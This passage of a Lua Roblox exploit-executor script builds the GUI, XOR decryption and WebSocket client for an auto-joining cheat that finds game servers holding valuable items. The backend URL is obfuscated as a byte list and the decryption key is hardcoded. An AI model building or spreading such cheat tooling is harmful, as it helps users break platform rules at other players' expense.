	Instance.new("UICorner", j).CornerRadius = UDim.new(0, 6)

	if not hasSI then
		j.BackgroundColor3 = THEME.Secondary; j.Text = "NO ID"; j.TextColor3 = THEME.DimText
	elseif isDuel then
		j.BackgroundColor3 = THEME.Red; j.Text = "JOIN"; j.TextColor3 = THEME.Text
	elseif isWS then
		j.BackgroundColor3 = THEME.Orange; j.Text = "JOIN"; j.TextColor3 = THEME.Text
	else
		j.BackgroundColor3 = tC; j.Text = "JOIN"; j.TextColor3 = THEME.BG
	end
	if hasSI then j.MouseButton1Click:Connect(function() SmartJoin(serverId, j) end) end

	local ep = Instance.new("Frame", wr)
	ep.Size = UDim2.new(1, 0, 0, 0); ep.Position = UDim2.new(0, 0, 0, RH)
	ep.BackgroundColor3 = THEME.ExpandBG; ep.BorderSizePixel = 0
	ep.BackgroundTransparency = 0.3; ep.Visible = false; ep.ClipsDescendants = true
	Instance.new("UICorner", ep).CornerRadius = UDim.new(0, 6)

	local epl = Instance.new("UIListLayout", ep)
	epl.Padding = UDim.new(0, 2); epl.SortOrder = Enum.SortOrder.LayoutOrder

	local ept = Instance.new("TextLabel", ep)
	ept.Size = UDim2.new(1, 0, 0, 20); ept.Text = "  Brainrots du serveur :"
	ept.TextColor3 = THEME.Accent; ept.Font = Enum.Font.GothamBold
	ept.TextSize = M.fontSizeSmall - 1; ept.BackgroundTransparency = 1
	ept.TextXAlignment = Enum.TextXAlignment.Left; ept.LayoutOrder = 0

	local isExp = false
	local function buildExp()
		for _, ch in ipairs(ep:GetChildren()) do if ch:IsA("Frame") then ch:Destroy() end end
		local all = getAllBrainrotsInServer(serverId)
		local rh  = isMobile and 28 or 24
		local cH  = 20 + (#all * (rh + 2)) + 4
		for idx, e in ipairs(all) do
			local eP = table.find(Config.PriorityList, e.name) ~= nil
			local r  = Instance.new("Frame", ep)
			r.Size   = UDim2.new(1, -8, 0, rh)
			r.BackgroundColor3 = eP
				and Color3.fromRGB(30, 22, 46)
				or  (idx % 2 == 0 and Color3.fromRGB(24, 22, 36) or Color3.fromRGB(20, 18, 30))
			r.BorderSizePixel = 0; r.LayoutOrder = idx
			Instance.new("UICorner", r).CornerRadius = UDim.new(0, 4)
			if eP then
				local pBar = Instance.new("Frame", r)
				pBar.Size = UDim2.new(0, 2, 0.7, 0); pBar.Position = UDim2.new(0, 0, 0.15, 0)
				pBar.BackgroundColor3 = THEME.Accent; pBar.BorderSizePixel = 0
				Instance.new("UICorner", pBar).CornerRadius = UDim.new(0, 2)
			end
			local pi = Instance.new("TextLabel", r)
			pi.Size = UDim2.new(0, 16, 1, 0); pi.Position = UDim2.new(0, 8, 0, 0)
			pi.Text = eP and "⭐" or "·"
			pi.TextColor3 = eP and THEME.Gold or THEME.DimText
			pi.TextSize = eP and 10 or 8; pi.Font = Enum.Font.GothamBold; pi.BackgroundTransparency = 1
			local en = Instance.new("TextLabel", r)
			en.Size = UDim2.new(0.55, 0, 1, 0); en.Position = UDim2.new(0, 26, 0, 0)
			en.Text = e.name
			en.TextColor3 = eP and THEME.Gold or THEME.Text
			en.Font = eP and Enum.Font.GothamBold or Enum.Font.Gotham
			en.TextSize = M.fontSizeSmall; en.BackgroundTransparency = 1
			en.TextXAlignment = Enum.TextXAlignment.Left; en.TextTruncate = Enum.TextTruncate.AtEnd
			local ev = Instance.new("TextLabel", r)
			ev.Size = UDim2.new(0, 65, 1, 0); ev.Position = UDim2.new(1, -70, 0, 0)
			ev.Text = tostring(e.value or "")
			ev.TextColor3 = eP and THEME.Gold or THEME.SubText
			ev.Font = Enum.Font.GothamBold; ev.TextSize = M.fontSizeSmall
			ev.BackgroundTransparency = 1; ev.TextXAlignment = Enum.TextXAlignment.Right
		end
		return cH
	end

	local cb = Instance.new("TextButton", it)
	cb.Size = UDim2.new(1, -(M.joinBtnW+8), 1, 0); cb.BackgroundTransparency = 1
	cb.Text = ""; cb.ZIndex = 5
	cb.MouseButton1Click:Connect(function()
		if not hasSD then return end
		isExp = not isExp
		if isExp then
			local ch = buildExp(); ep.Visible = true; ep.Size = UDim2.new(1, 0, 0, ch)
			wr:TweenSize(UDim2.new(1, -4, 0, RH + ch + 4), "Out", "Quad", 0.25, true)
			if arrow then arrow.Text = "▲" end
			TweenService:Create(it, TweenInfo.new(0.15), {BackgroundColor3 = THEME.CardHover}):Play()
		else
			wr:TweenSize(UDim2.new(1, -4, 0, RH), "Out", "Quad", 0.2, true)
			task.delay(0.2, function()
				ep.Visible = false
				for _, ch in ipairs(ep:GetChildren()) do if ch:IsA("Frame") then ch:Destroy() end end
			end)
			if arrow then arrow.Text = "▼" end
			TweenService:Create(it, TweenInfo.new(0.15), {BackgroundColor3 = rowBG}):Play()
		end
	end)

	task.spawn(function()
		while wr and wr.Parent do
			local d = math.floor((os.time()*1000 - localTime)/1000)
			if d >= 150 then wr:Destroy(); break end
			el.Text = d.."s"; task.wait(1)
		end
	end)

	do
		local s = Instance.new("Sound", SoundService)
		s.SoundId = "rbxassetid://"..tostring(Config.SoundID); s.Volume = Config.Volume
		s:Play(); task.delay(5, function() s:Destroy() end)
		if not main.Visible then
			ShowPopUp("ALERTE !", pet.." "..cleanDisplay.." "..mutation, tC, hasSI and serverId or nil)
		end
		if Config.AutoJoin and not isDuel and hasSI and (isP or hasPrioInSrv) then
			SmartJoin(serverId, j)
		end
	end
end

-- ============================================================
-- [[ NAVIGATION ]]
-- ============================================================
local nav = Instance.new("Frame", main)
nav.Size = UDim2.new(1, -12, 0, M.navH); nav.Position = UDim2.new(0.5, 0, 1, -6)
nav.AnchorPoint = Vector2.new(0.5, 1); nav.BackgroundTransparency = 1; nav.ZIndex = 50

local nL = Instance.new("UIListLayout", nav)
nL.FillDirection = Enum.FillDirection.Horizontal; nL.Padding = UDim.new(0.01, 0)
nL.VerticalAlignment = Enum.VerticalAlignment.Center

local navButtons = {}; local activePage = filterPage
local function createTab(label, tp)
	local b = Instance.new("TextButton", nav)
	b.Size = UDim2.new(0.23, 0, 0.9, 0)
	b.BackgroundColor3 = (tp == activePage) and THEME.Accent or THEME.Secondary
	b.Text = label; b.TextColor3 = (tp == activePage) and THEME.Text or THEME.Accent
	b.Font = Enum.Font.GothamBold; b.TextSize = isMobile and 9 or 10; b.ZIndex = 51
	Instance.new("UICorner", b).CornerRadius = UDim.new(0, 6)
	navButtons[tp] = b
	b.MouseButton1Click:Connect(function()
		activePage = tp
		filterPage.Visible  = (tp == filterPage)
		generalPage.Visible = (tp == generalPage)
		joinerPage.Visible  = (tp == joinerPage)
		for pg, bt in pairs(navButtons) do
			if pg == tp then
				TweenService:Create(bt, TweenInfo.new(0.2), {BackgroundColor3 = THEME.Accent}):Play()
				bt.TextColor3 = THEME.Text
			else
				TweenService:Create(bt, TweenInfo.new(0.2), {BackgroundColor3 = THEME.Secondary}):Play()
				bt.TextColor3 = THEME.Accent
			end
		end
	end)
end
createTab("FILTERS", filterPage)
createTab("GENERAL", generalPage)
createTab("LOGS",    joinerPage)

local ajBtn = Instance.new("TextButton", nav)
ajBtn.Size = UDim2.new(0.23, 0, 0.9, 0); ajBtn.BackgroundColor3 = THEME.Secondary
ajBtn.Text = "AUTO JOIN"; ajBtn.TextColor3 = THEME.Accent
ajBtn.Font = Enum.Font.GothamBold; ajBtn.TextSize = isMobile and 8 or 10; ajBtn.ZIndex = 51
Instance.new("UICorner", ajBtn).CornerRadius = UDim.new(0, 6)
ajBtn.MouseButton1Click:Connect(function() Config.AutoJoin = not Config.AutoJoin; SaveConfig(Config) end)
task.spawn(function()
	while task.wait(0.3) do
		TweenService:Create(ajBtn, TweenInfo.new(0.2), {BackgroundColor3 = Config.AutoJoin and THEME.Accent or THEME.Secondary}):Play()
		ajBtn.TextColor3 = Config.AutoJoin and THEME.Text or THEME.Accent
	end
end)

-- ============================================================
-- [[ DRAG & RESIZE ]]
-- ============================================================
local function EnableDrag(frame, handle)
	local dt, ds, sp
	handle.InputBegan:Connect(function(i)
		if i.UserInputType == Enum.UserInputType.MouseButton1 or i.UserInputType == Enum.UserInputType.Touch then
			dt = true; ds = i.Position; sp = frame.Position
		end
	end)
	UserInputService.InputChanged:Connect(function(i)
		if dt and (i.UserInputType == Enum.UserInputType.MouseMovement or i.UserInputType == Enum.UserInputType.Touch) then
			local d = i.Position - ds
			frame.Position = UDim2.new(sp.X.Scale, sp.X.Offset + d.X, sp.Y.Scale, sp.Y.Offset + d.Y)
		end
	end)
	UserInputService.InputEnded:Connect(function(i)
		if i.UserInputType == Enum.UserInputType.MouseButton1 or i.UserInputType == Enum.UserInputType.Touch then
			dt = false
		end
	end)
end
EnableDrag(main, header)

local rs = M.resizeSize
local rb = Instance.new("TextButton", main)
rb.Size = UDim2.new(0, rs, 0, rs); rb.Position = UDim2.new(1, -rs, 1, -rs)
rb.BackgroundColor3 = isMobile and THEME.Secondary or Color3.new(0, 0, 0)
rb.BackgroundTransparency = isMobile and 0 or 1; rb.Text = "◢"
rb.TextColor3 = THEME.Accent; rb.TextSize = isMobile and 16 or 14; rb.ZIndex = 110
if isMobile then Instance.new("UICorner", rb).CornerRadius = UDim.new(0, 6) end

local resizing = false
rb.InputBegan:Connect(function(i)
	if i.UserInputType == Enum.UserInputType.MouseButton1 or i.UserInputType == Enum.UserInputType.Touch then
		resizing = true
	end
end)
UserInputService.InputChanged:Connect(function(i)
	if resizing and (i.UserInputType == Enum.UserInputType.MouseMovement or i.UserInputType == Enum.UserInputType.Touch) then
		local mp = UserInputService:GetMouseLocation()
		main.Size = UDim2.new(0, math.max(mp.X - main.AbsolutePosition.X, minWidth), 0, math.max((mp.Y - 36) - main.AbsolutePosition.Y, minHeight))
	end
end)
UserInputService.InputEnded:Connect(function() resizing = false end)

-- ============================================================
-- [[ OPEN BUTTON ]]
-- ============================================================
openBtn = Instance.new("TextButton", sg)
openBtn.Size = UDim2.new(0, isMobile and 80 or 100, 0, isMobile and 28 or 32)
openBtn.Position = UDim2.new(0.5, isMobile and -40 or -50, 0, 10)
openBtn.BackgroundColor3 = THEME.Secondary; openBtn.Text = "UCHIWA"
openBtn.TextColor3 = THEME.Accent; openBtn.Font = Enum.Font.GothamBold
openBtn.TextSize = isMobile and 12 or 14; openBtn.Visible = true
Instance.new("UICorner", openBtn).CornerRadius = UDim.new(0, 8)
Instance.new("UIStroke", openBtn).Color = THEME.Accent

closeBtn.MouseButton1Click:Connect(function() closeUI() end)
openBtn.MouseButton1Click:Connect(function() openUI() end)

-- ============================================================
-- [[ 🔒 DÉCHIFFREMENT XOR ]]
-- ============================================================
-- Clé qui correspond au backend
local _DK = {55,48,53,52,101,57,54,51,100,100,49,55,57,49,54,99,50,99,99,52,49,48,56,99,48,54,50,101,99,100,49,54,97,54,53,53,50,51,52,101,98,54,49,55,54,100,55,54,100,51,56,97,50,52,101,55,99,97,48,50,51,102,102,52}
local function _dk()
	local s = ""
	for _, v in ipairs(_DK) do s = s .. string.char(v) end
	return s
end

local function xorDecrypt(hex, key)
	local result = ""
	for i = 1, #hex, 2 do
		local byte = tonumber(hex:sub(i, i + 1), 16)
		local keyByte = string.byte(key, (math.floor((i - 1) / 2) % #key) + 1)
		result = result .. string.char(bit32.bxor(byte, keyByte))
	end
	return result
end

local function decryptAlert(encData)
	local ok, result = pcall(function()
		local json = xorDecrypt(encData, _dk())
		return HttpService:JSONDecode(json)
	end)
	if ok then return result end
	return nil
end

-- ============================================================
-- [[ HANDLE ALERT — logique commune WS + HTTP ]]
-- ============================================================
local displayedServers = {}

local function handleAlert(a)
	if not a or not a.brainrotName or not a.serverId then return end
	local sid = a.serverId
	local now = os.time() * 1000

	addToServerCache(sid, a.brainrotName, a.value, a.timestamp)

	if displayedServers[sid] and (now - displayedServers[sid]) < 5000 then return end

	local vn = tonumber((a.value or "0"):match("[%d%.]+")) or 0
	local bestPrio = getBestPriorityInServer(sid)
	local best = bestPrio or getBestBrainrotInServer(sid)
	local dP = best and best.name  or a.brainrotName
	local dV = best and best.value or a.value
	local dN = best and best.numValue or vn

	local nP = (#Config.PriorityList == 0)
	if nP then
		local lim = tonumber(Config.MinValue) or 0
		if dN >= lim then
			AddWSLog(dP, dV, a.botId, sid, a.timestamp, a.inDuel)
			displayedServers[sid] = now
			local count = #getAllBrainrotsInServer(sid)
			print(string.format("🐾 %s | %d brainrot%s", dP, count, count > 1 and "s" or ""))
		end
	else
		local found = false
		local allInServer = getAllBrainrotsInServer(sid)
		if bestPrio then
			local lim = tonumber(Config.CustomMin[bestPrio.name]) or tonumber(Config.MinValue) or 0
			if bestPrio.numValue >= lim then found = true end
		end
		if not found then
			for _, br in ipairs(allInServer) do
				if table.find(Config.PriorityList, br.name) then
					local lim = tonumber(Config.CustomMin[br.name]) or tonumber(Config.MinValue) or 0
					if br.numValue >= lim then found = true; break end
				end
			end
		end
		if not found and table.find(Config.PriorityList, a.brainrotName) then
			local lim = tonumber(Config.CustomMin[a.brainrotName]) or tonumber(Config.MinValue) or 0
			local alertNum = tonumber((a.value or "0"):match("[%d%.]+")) or 0
			if alertNum >= lim then found = true end
		end
		if found then
			AddWSLog(dP, dV, a.botId, sid, a.timestamp, a.inDuel)
			displayedServers[sid] = now
		end
	end
end

-- ============================================================
-- [[ 🔌 WEBSOCKET — remplace entièrement le HTTP polling ]]
-- ============================================================
-- Remplace le bloc :
--   task.spawn(function() while true do syn.request... end end)
-- par ce bloc ci-dessous.
-- Tout le reste du script (handleAlert, decryptAlert, UI, etc.) reste INTACT.
-- ============================================================

local _E = string.char
local _W = _E(119,115,115,58,47,47,109,97,105,110,45,101,114,116,54,46,111,110,114,101,110,100,101,114,46,99,111,109)

local WS_PING_INTERVAL  = 20   -- secondes entre pings keepalive
local WS_RECONNECT_DELAY = 5   -- secondes avant tentative de reconnexion

local _wsRunning  = true
local _wsInstance = nil

local function _wsConnect()
	-- Tentative de connexion
	local ok, ws = pcall(function() return WebSocket.connect(_W) end)
	if not ok or not ws then
		warn("[WS] Connexion échouée, retry dans " .. WS_RECONNECT_DELAY .. "s")
		task.wait(WS_RECONNECT_DELAY)
		if _wsRunning then task.spawn(_wsConnect) end
		return
	end

	_wsInstance = ws
	print("[WS] ✅ Connecté au backend")

	-- Ping périodique pour maintenir la connexion ouverte
	local pingThread = task.spawn(function()
		while _wsRunning and _wsInstance == ws do
			task.wait(WS_PING_INTERVAL)
			if _wsInstance == ws then
				pcall(function()
					ws:Send(HttpService:JSONEncode({ type = "ping" }))
				end)
			end
		end
	end)

	-- Réception des messages
	ws.OnMessage:Connect(function(raw)
		local ok2, msg = pcall(function()
			return HttpService:JSONDecode(raw)
		end)
		if not ok2 or type(msg) ~= "table" then return end

		local t = msg.type

		-- Pong — ignorer silencieusement
		if t == "pong" or t == "connected" then return end

		-- Snapshot : tous les groupes actifs à la connexion
		if t == "snapshot" then
			if not msg.enc then return end
			local data = decryptAlert(msg.enc)
			if not data or type(data.groups) ~= "table" then return end
			for _, group in ipairs(data.groups) do
				-- Reconstruire des alerts individuelles depuis chaque groupe
				if group.serverId and group.brainrots then
					for _, br in ipairs(group.brainrots) do
						handleAlert({
							brainrotName = br.brainrotName or br.name,
							value        = br.value,
							serverId     = group.serverId,
							placeId      = group.placeId,
							botId        = br.botId,
							players      = group.players,
							priority     = br.priority,
							inDuel       = br.inDuel,
							mutation     = br.mutation,
							timestamp    = group.lastUpdate or (os.time() * 1000),
							source       = group.source,
						})
					end
				end
			end
			return
		end

		-- Alerte individuelle
		if t == "alert" then
			if not msg.enc then return end
			local a = decryptAlert(msg.enc)
			if a then
				a.id        = a.id or 0
				a.timestamp = a.timestamp or (os.time() * 1000)
				handleAlert(a)
			end
			return
		end

		-- Mise à jour d'un groupe serveur
		if t == "server_update" then
			if not msg.enc then return end
			local group = decryptAlert(msg.enc)
			if not group or not group.serverId then return end
			-- Mettre à jour le cache de chaque brainrot du groupe
			if group.brainrots then
				for _, br in ipairs(group.brainrots) do
					addToServerCache(
						group.serverId,
						br.brainrotName or br.name,
						br.value,
						group.lastUpdate or (os.time() * 1000)
					)
				end
			end
			return
		end
	end)

	-- Déconnexion → reconnexion automatique
	ws.OnClose:Connect(function()
		_wsInstance = nil
		task.cancel(pingThread)
		warn("[WS] ❌ Connexion perdue")
		if _wsRunning then
			task.wait(WS_RECONNECT_DELAY)
			if _wsRunning then task.spawn(_wsConnect) end
		end
	end)
end

-- Lancement
task.spawn(_wsConnect)

-- ============================================================
-- [[ CLEANUP CACHE ]] — inchangé
-- ============================================================
task.spawn(function()
	while task.wait(300) do
		local now = os.time() * 1000
		for sid, entries in pairs(serverBrainrots) do
			local f = {}
			for _, e in ipairs(entries) do
				if (now - e.timestamp) < 300000 then table.insert(f, e) end
			end
			if #f == 0 then serverBrainrots[sid] = nil else serverBrainrots[sid] = f end
		end
	end
end)
-- ============================================================
-- [[ CLEANUP CACHE ]]
-- ============================================================
task.spawn(function()
	while task.wait(300) do
		local now = os.time() * 1000
		for sid, entries in pairs(serverBrainrots) do
			local f = {}
			for _, e in ipairs(entries) do
				if (now - e.timestamp) < 300000 then table.insert(f, e) end
			end
			if #f == 0 then serverBrainrots[sid] = nil else serverBrainrots[sid] = f end
		end
	end
end)